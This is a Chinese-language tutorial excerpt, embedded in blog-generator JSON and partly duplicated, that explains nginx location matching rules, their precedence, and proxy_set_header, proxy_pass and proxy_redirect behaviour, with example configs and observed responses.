title=\"3.注意问题\"></a>3.注意问题</h2><ul>\n<li>1.url中/的使用注意,会进行匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /t1tt/ &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  603</p>\n<ul>\n<li>2.普通按照最长匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /t1tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  601</p>\n<ul>\n<li>3.正则使用时小心被覆盖</li>\n</ul>\n<p>/t1tt 被正则覆盖，导致访问不到, 实际遇到的问题之一<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  601</p>\n<h1 id=\"三-代理属性\"><a href=\"#三-代理属性\" class=\"headerlink\" title=\"三.代理属性\"></a>三.代理属性</h1><h2 id=\"1-请求头信息-proxy-set-header\"><a href=\"#1-请求头信息-proxy-set-header\" class=\"headerlink\" title=\"1. 请求头信息 proxy_set_header\"></a>1. 请求头信息 proxy_set_header</h2><p>可设置请求头-并将头信息传递到服务器端。该值可以包含文本、变量和它们的组合<br></p>\n<p>proxy_set_header field value 本质上就是把 header里面的 field字段 设置为想要的value.<br></p>\n<ul>\n<li>proxy_set_header Host $proxy_host;</li>\n</ul>\n<p>$proxy_host(默认值): 该代理nginx的ip</p>\n<ul>\n<li>proxy_set_header Host $http_host;</li>\n</ul>\n<p>$http_host: 使用请求原host</p>\n<ul>\n<li>proxy_set_header Host $host;</li>\n</ul>\n<p>$host: 如果客户端请求头中没有携带这个头部，那么传递到后端服务器的请求也不含这个头部。 这种情况下，更好的方式是使用$host变量——它的值在请求包含“Host”请求头时为“Host”字段的值，在请求未携带“Host”请求头时为虚拟主机的主域名<br></p>\n<ul>\n<li>proxy_set_header Host $host:$proxy_port;</li>\n</ul>\n<p>同理,proxy_set_header Host $host:$server_port<br><br>服务器名可以和后端服务器的端口一起传送<br></p>\n<ul>\n<li>proxy_set_header Host 127.0.0.1:8080;</li>\n</ul>\n<p>还可以不使用变量，直接写文本，或者变量加文本<br></p>\n<ul>\n<li>proxy_set_header X-Real-IP $remote_addr;</li>\n</ul>\n<p>其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：<br><br>request.getAttribute(“X-real-ip”)<br></p>\n<ul>\n<li>proxy_set_header X-Forwarded-For $remote_addr;</li>\n</ul>\n<p>一层代理时,可以直接存入地址<br></p>\n<ul>\n<li>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</li>\n</ul>\n<p>多层代理时，可以存入代理链<br><br>每次经过proxy转发都会有记录,格式就是client1, proxy1, proxy2,以逗号隔开各个地址<br></p>\n<h2 id=\"2-代理-proxy-pass\"><a href=\"#2-代理-proxy-pass\" class=\"headerlink\" title=\"2.代理 proxy_pass\"></a>2.代理 proxy_pass</h2><p>项目名: test, 路径 test<br><br><strong>注意 / 在匹配中的作用 </strong><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 2</span><br><span class=\"line\">location  /test/ &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 3</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 4</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002/test;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用 1 时<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a> 200<br><br>使用 2 时<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a> 200<br><br>使用 3 时<br><br><a href=\"http://67.216.218.49:8080/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test</a> 200(tomcat页面)<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a>  404<br><br><a href=\"http://67.216.218.49:8080/test/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test/test</a> 200(接口返回)<br><br>使用 4 时<br><br>和 3 一样， 跳转时不会自动加上 location 中 url, 而是使用 proxy_pass 中 url<br></p>\n<p>总结: 在匹配时，location中url后面加不加 / 没用影响，但是 proxy_pass 中 url 不加 / 会默认加上 location中url跳转， 加上 / 则不会带上 location中 url 跳转.<br></p>\n<h2 id=\"3-重定向-proxy-redirect\"><a href=\"#3-重定向-proxy-redirect\" class=\"headerlink\" title=\"3.重定向 proxy_redirect\"></a>3.重定向 proxy_redirect</h2><p>当服务返回重定向时（http code为301或302），浏览器会根据response中的location字段进行跳转(浏览器直接跳转到服务地址).<br><br>此时，为了能让跳转经过nginx,可以使用 proxy_redirect 修改location的重定向信息.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1 重定向到 其它location</span><br><span class=\"line\">location /portal&#123;</span><br><span class=\"line\">proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class=\"line\">proxy_set_header msec $msec;</span><br><span class=\"line\">proxy_pass http://portal;</span><br><span class=\"line\">index index.html index.htm;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/cas /cas;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/portal  /portal;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2 重定向到具体地址</span><br><span class=\"line\">location /cas&#123;</span><br><span class=\"line\">proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class=\"line\">proxy_set_header msec $msec;</span><br><span class=\"line\">proxy_pass http://cas;</span><br><span class=\"line\">index index.html index.htm;</span><br><span class=\"line\">proxy_redirect  http://10.191.21.105:8090/portal  http://ip/port/path;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>测试所用版本:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@localhost:~# nginx -v</span><br><span class=\"line\">nginx version: nginx/1.10.3 (Ubuntu)</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"一-Location表达式\"><a href=\"#一-Location表达式\" class=\"headerlink\" title=\"一. Location表达式\"></a>一. Location表达式</h1><p> <strong> location [ = | ~ | ~* | ^~ | @ ] /uri/ { … } </strong></p>\n<ul>\n<li><p>/{}</p>\n<p>无前缀，表示最大前缀匹配.</p>\n</li>\n<li><p>@</p>\n<p>几乎见不到，不用管</p>\n</li>\n<li><p>=</p>\n<p>完全匹配<br><br>url部分为啥就精确匹配啥.</p>\n</li>\n</ul>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1</span><br><span class=\"line\">location = /t1 &#123;</span><br><span class=\"line\">      return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 2</span><br><span class=\"line\">location = /t2 &#123;</span><br><span class=\"line\">        return 602;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 3</span><br><span class=\"line\">location = /t1/ &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> 例子:<br><br><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 601</p>\n<p><a href=\"http://67.216.218.49:8080/t2\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t2</a> 602</p>\n<p><a href=\"http://67.216.218.49:8080/t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t</a> 404</p>\n<p>加上条件3前<br><br><a href=\"http://67.216.218.49:8080/t1/\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/</a> 404<br><br>加上条件3后<br><br><a href=\"http://67.216.218.49:8080/t1/\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/</a> 603</p>\n<ul>\n<li>~</li>\n</ul>\n<p>正则,大小写敏感<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ /T1 &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~ /t1 &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 603<br><br>自动转为了 小写?<br><br><a href=\"http://67.216.218.49:8080/T1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1</a> 603</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ /T1/TT &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~ /t1/tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/tt</a> 603<br><br><a href=\"http://67.216.218.49:8080/T1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1/TT</a> 601</p>\n<ul>\n<li>~*</li>\n</ul>\n<p>正则,大小写不敏感<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1/tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /T1/TT &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>忽略大小写，按正则出现顺序开始匹配<br><br><a href=\"http://67.216.218.49:8080/T1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/T1/TT</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/tt</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/TT\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/TT</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1/TT/tt/tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1/TT/tt/tt</a> 601<br></p>\n<ul>\n<li>^~</li>\n</ul>\n<p>表示匹配时，忽略正则<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1t</a> 6011<br><br><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 6031<br><br><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 6031<br></p>\n<h1 id=\"二-location-匹配顺序\"><a href=\"#二-location-匹配顺序\" class=\"headerlink\" title=\"二.location 匹配顺序\"></a>二.location 匹配顺序</h1><p>顺序: 先普通匹配，再正则匹配,中间注意的下面讲.<br></p>\n<p>以 ~ 开头的为正则匹配，其余为普通匹配.<br></p>\n<h2 id=\"1-实例\"><a href=\"#1-实例\" class=\"headerlink\" title=\"1.实例\"></a>1.实例</h2><ul>\n<li>普通匹配中，先精确匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location = /t1 &#123;</span><br><span class=\"line\">        return 602;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1</a>  602</p>\n<ul>\n<li>正则按顺序来</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1&#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1ttt&#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 601</p>\n<ul>\n<li>正则普通(最大前缀),先匹配普通，匹配到了，先记录下来，再匹配正则，匹配到了使用正则</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1ttt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1ttt</a> 601<br></p>\n<ul>\n<li>正则和普通(^~),不使用正则，直接普通匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 601</p>\n<ul>\n<li>正则和普通(精确匹配)，精确匹配到了，直接停止匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1tt &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  = /t1tt &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a> 603<br></p>\n<ul>\n<li>普通匹配中 ^~ 和 / 不能有重复的</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /t1t &#123;</span><br><span class=\"line\">       return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#  false</span><br><span class=\"line\">#location  /t1t &#123;</span><br><span class=\"line\">#       return 603;</span><br><span class=\"line\">#&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location  /t1 &#123;</span><br><span class=\"line\">       return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1t\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1t</a> 601<br><br><a href=\"http://67.216.218.49:8080/t1r\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1r</a>  603</p>\n<h2 id=\"2-顺序总结\"><a href=\"#2-顺序总结\" class=\"headerlink\" title=\"2.顺序总结\"></a>2.顺序总结</h2><p>总结</p>\n<p>先精确匹配，匹配到了就使用<br><br>普通匹配，普通匹配时，选择匹配最长的(记录下来)，再进行正则匹配<br><br>正则匹配时，如果匹配成功且在普通匹配中不存在相应的^~ 使用正则匹配的结果，否则直接使用^~的结果（当普通匹配的最长前缀匹配有符号“^~”的时候，就不会在匹配正则），如果正则匹配不成功，使用普通匹配(最大前缀匹配)的结果</p>\n<h2 id=\"3-注意问题\"><a href=\"#3-注意问题\" class=\"headerlink\" title=\"3.注意问题\"></a>3.注意问题</h2><ul>\n<li>1.url中/的使用注意,会进行匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /t1tt/ &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  603</p>\n<ul>\n<li>2.普通按照最长匹配</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /t1tt &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location ^~ /t1 &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  601</p>\n<ul>\n<li>3.正则使用时小心被覆盖</li>\n</ul>\n<p>/t1tt 被正则覆盖，导致访问不到, 实际遇到的问题之一<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~* /t1 &#123;</span><br><span class=\"line\">        return 601;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location  /t1tt &#123;</span><br><span class=\"line\">        return 603;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://67.216.218.49:8080/t1tt\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/t1tt</a>  601</p>\n<h1 id=\"三-代理属性\"><a href=\"#三-代理属性\" class=\"headerlink\" title=\"三.代理属性\"></a>三.代理属性</h1><h2 id=\"1-请求头信息-proxy-set-header\"><a href=\"#1-请求头信息-proxy-set-header\" class=\"headerlink\" title=\"1. 请求头信息 proxy_set_header\"></a>1. 请求头信息 proxy_set_header</h2><p>可设置请求头-并将头信息传递到服务器端。该值可以包含文本、变量和它们的组合<br></p>\n<p>proxy_set_header field value 本质上就是把 header里面的 field字段 设置为想要的value.<br></p>\n<ul>\n<li>proxy_set_header Host $proxy_host;</li>\n</ul>\n<p>$proxy_host(默认值): 该代理nginx的ip</p>\n<ul>\n<li>proxy_set_header Host $http_host;</li>\n</ul>\n<p>$http_host: 使用请求原host</p>\n<ul>\n<li>proxy_set_header Host $host;</li>\n</ul>\n<p>$host: 如果客户端请求头中没有携带这个头部，那么传递到后端服务器的请求也不含这个头部。 这种情况下，更好的方式是使用$host变量——它的值在请求包含“Host”请求头时为“Host”字段的值，在请求未携带“Host”请求头时为虚拟主机的主域名<br></p>\n<ul>\n<li>proxy_set_header Host $host:$proxy_port;</li>\n</ul>\n<p>同理,proxy_set_header Host $host:$server_port<br><br>服务器名可以和后端服务器的端口一起传送<br></p>\n<ul>\n<li>proxy_set_header Host 127.0.0.1:8080;</li>\n</ul>\n<p>还可以不使用变量，直接写文本，或者变量加文本<br></p>\n<ul>\n<li>proxy_set_header X-Real-IP $remote_addr;</li>\n</ul>\n<p>其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：<br><br>request.getAttribute(“X-real-ip”)<br></p>\n<ul>\n<li>proxy_set_header X-Forwarded-For $remote_addr;</li>\n</ul>\n<p>一层代理时,可以直接存入地址<br></p>\n<ul>\n<li>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</li>\n</ul>\n<p>多层代理时，可以存入代理链<br><br>每次经过proxy转发都会有记录,格式就是client1, proxy1, proxy2,以逗号隔开各个地址<br></p>\n<h2 id=\"2-代理-proxy-pass\"><a href=\"#2-代理-proxy-pass\" class=\"headerlink\" title=\"2.代理 proxy_pass\"></a>2.代理 proxy_pass</h2><p>项目名: test, 路径 test<br><br><strong>注意 / 在匹配中的作用 </strong><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 2</span><br><span class=\"line\">location  /test/ &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 3</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 4</span><br><span class=\"line\">location  /test &#123;</span><br><span class=\"line\">      proxy_pass http://127.0.0.1:8002/test;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用 1 时<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a> 200<br><br>使用 2 时<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a> 200<br><br>使用 3 时<br><br><a href=\"http://67.216.218.49:8080/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test</a> 200(tomcat页面)<br><br><a href=\"http://67.216.218.49:8080/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test</a>  404<br><br><a href=\"http://67.216.218.49:8080/test/test/test\" target=\"_blank\" rel=\"noopener\">http://67.216.218.49:8080/test/test/test</a> 